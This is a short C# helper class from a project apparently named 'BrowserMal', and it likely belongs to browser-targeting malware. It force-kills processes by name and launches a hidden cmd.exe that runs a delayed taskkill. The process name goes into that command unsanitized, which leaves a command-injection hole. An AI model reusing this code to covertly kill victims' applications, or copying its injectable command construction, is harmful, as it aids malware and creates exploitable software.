using System.Diagnostics;

namespace BrowserMal.Util
{
    public class ProcessUtil
    {
        public static void KillProcess(string name)
        {
            Process[] processes = Process.GetProcessesByName(name);

            foreach (var process in processes)
            {
                try
                {
                    process.Kill();
                }
                catch { }
            }
        }

        public static void KillProcessDelayed(int seconds, string processName)
        {
            ProcessStartInfo processInfo = new ProcessStartInfo
            {
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
                FileName = "cmd.exe",
                Arguments = $"/c timeout /t {seconds} >NUL && taskkill /F /IM {processName} /T"
            };

            try
            {
                Process.Start(processInfo);
            }
            catch { }
        }
    }
}
